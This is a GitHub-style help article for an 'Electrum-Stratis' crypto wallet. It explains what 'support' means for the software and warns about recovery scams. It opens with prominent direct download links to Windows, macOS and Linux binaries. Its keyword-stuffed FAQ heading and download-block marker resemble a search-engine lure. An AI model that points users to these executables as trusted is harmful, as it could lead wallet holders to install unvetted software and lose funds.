![Electrum-Stratis](assets/banner-article.png)

# Does Stratis still support the Electrum wallet?

<p align="center">Maintenance, releases and what support actually means</p>

<p align="center"><a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe"><img alt="Download for Windows" src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-089ae8?style=for-the-badge&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg"><img alt="Download for macOS" src="https://img.shields.io/badge/DOWNLOAD-MACOS-089ae8?style=for-the-badge&labelColor=071727&logo=apple&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip"><img alt="Download for Linux" src="https://img.shields.io/badge/DOWNLOAD-LINUX-089ae8?style=for-the-badge&labelColor=071727&logo=linux&logoColor=ffffff"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img alt="Windows" height="24" src="https://img.shields.io/badge/os-windows-089ae8?style=flat-square&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"> | Windows 10 (1909) or later, 64-bit | [`electrum-stratis-v2.7.19.exe`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe) |
| <img alt="macOS" height="24" src="https://img.shields.io/badge/os-macos-089ae8?style=flat-square&labelColor=071727&logo=apple&logoColor=ffffff"> | macOS 12 or later | [`electrum-stratis-v2.7.19.dmg`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg) |
| <img alt="Linux" height="24" src="https://img.shields.io/badge/os-linux-089ae8?style=flat-square&labelColor=071727&logo=linux&logoColor=ffffff"> | x64, Ubuntu 20.04 or later, or equivalent | [`electrum-stratis-v2.7.19.zip`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip) |

</div>

All versions, installers and checksums are on the [Electrum-Stratis v2.7.19 release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19).

> Only download from this GitHub release page.

The wallet is actively maintained: builds are published on the release page, the codebase is public, and the software still serves the legacy Stratis chain. "Support" here means maintained software, not a company helpdesk, an account system or an email address that answers. Electrum Stratis is a self-custody desktop wallet for the legacy Stratis chain, and it has no custodian standing behind a balance.

## You'll see this if

<div align="center">

| What you are asking | The honest answer | Where to look |
|---|---|---|
| Is the project still alive? | Yes - builds are published and the source is public | The release page |
| Is there a support team? | Documentation, not a helpdesk | The articles by cluster |
| Will my coins stop working? | No; the legacy chain runs and the keys stay yours | The legacy-chain banner |
| Is my old build still supported? | Run the current one; older builds miss fixes | The version comparison |
| Who do I complain to? | Nobody holds your funds, so there is no account to escalate | Recovery articles |

</div>

The distinction matters because "support" in most software implies a vendor with an obligation. Here it means maintenance plus documentation, and the obligation to keep keys safe is the holder's.

## Why it happens

A self-custody wallet has no server-side account, so there is nothing for a support organisation to administer. It cannot reset a password, freeze a balance or restore a file; those powers belong to whoever holds the keys, which is the point of the design. A helpdesk could only ever tell you what the documentation already says.

That does not mean abandonment. It means the maintenance work is visible in a different place: commits, releases, fixed issues and a published build whose checksum you can check. Judging whether a project is alive is therefore a matter of looking at artefacts rather than asking for reassurance.

The maintained build is on the [release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19), and anyone claiming to be its support channel and asking for a seed is impersonating something that, by design, cannot need one.

Maintenance is visible in artefacts rather than in announcements: a tagged release with assets and hashes, a commit history that matches the build, a public issue tracker where fixes appear. A quiet month on a tracker says nothing either way, and a busy one says little more; the question that can be answered is whether a build exists that you can verify and run.

## Fix

1. **Check the release page first.** A published build with a checksum is the strongest evidence that the project is maintained, and it is available to anyone.
2. **Compare your build.** The app's security posture view shows version, build date, commit hash and advisory status; if it is behind, install the current build rather than waiting for an announcement.
3. **Use the documentation as support.** Every common failure - connection, balance, password, seed, Qt migration - has a written procedure, and each is self-contained.
4. **Treat any "support" contact as suspect unless it is documentation.** No legitimate channel asks for a seed, a private key, a wallet file or remote access, and none charges a fee to look at a balance.
5. **Keep your own records.** The wallet's maintenance does not extend to remembering your seed, your password or which file belongs to which wallet; that record is yours to keep.

If a question is genuinely not answered anywhere, that is worth noting as a gap rather than interpreting as abandonment. A missing article is a documentation problem; it is not evidence about the code. What is evidence is the stream of [Electrum Stratis recovery scams](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/main/paid-services-that-promise-funds-back.md) that claim to be support: they exist precisely because the real project has no channel that could ask for a seed. A missing article is a gap; a helpful stranger with a form is a fraud.

## If that did not work

If the release page looks quiet to you, that is a judgement about cadence rather than about status. The useful test is whether a build exists that you can verify and run, not how recently a commit appeared.

If your build fails and a newer one exists, updating is the fix rather than a workaround. That is the normal answer for legacy software: replace the binary, keep the wallet file, and re-check.

If someone contacts you claiming to be from the project and offering to fix an account, they are describing an account that does not exist. There is no login, no profile and no balance held anywhere but your machine.

## Prevention

- Bookmark the release page and check it before believing anything about the project's status.
- Keep the current build installed rather than an older one you happened to download.
- Never accept support over a direct message, whatever the account name.
- Keep the seed on paper and the wallet file backed up, so no support question becomes urgent.
- Record which build you run, so a later comparison is possible.
- Judge maintenance by release artefacts, not by forum sentiment or by the date of the last post you saw.

## FAQ

### Does STRATIS still support the ELECTRUM wallet?

Yes. The wallet is actively maintained for the legacy chain, and current builds are published on the release page. Support means maintained software and documentation, not a vendor helpdesk with access to your funds.

### Is there a support email or phone number?

No official support channel of that kind exists, and search results offering one are impersonation. The documentation covers the failures users actually encounter; anything asking for a seed or a fee is not support.

### Will an old build stop working?

An old build keeps running until something in its environment changes, but it misses later fixes and may behave differently on the network. Installing the current release is the reliable answer rather than testing how long an old binary survives.

### Who maintains the wallet?

The project's maintainers publish builds and source; the code lineage is Electrum's, and the fork is separate from Electrum Technologies. That separation is stated plainly rather than implied, which is the honest form of "who is behind this".

<!-- DOWNLOAD-BLOCK -->

A better test than the last commit date is whether you can complete the loop: download a build, check its hash against the release page, install it, and reach a synced state. When that loop works, the project is maintained in the only sense that affects you. When it fails, the reason for the failure is the useful fact, not the age of the repository.

## Related articles

- [Is Electrum Stratis safe to use?](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/how-safe-is-the-desktop-wallet.md)
- [Where to download the current build](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/where-to-get-the-current-build.md)
- [Which version is current, and is mine real?](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/which-release-is-current.md)
- [What Electrum Stratis actually is](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/what-this-wallet-is.md)
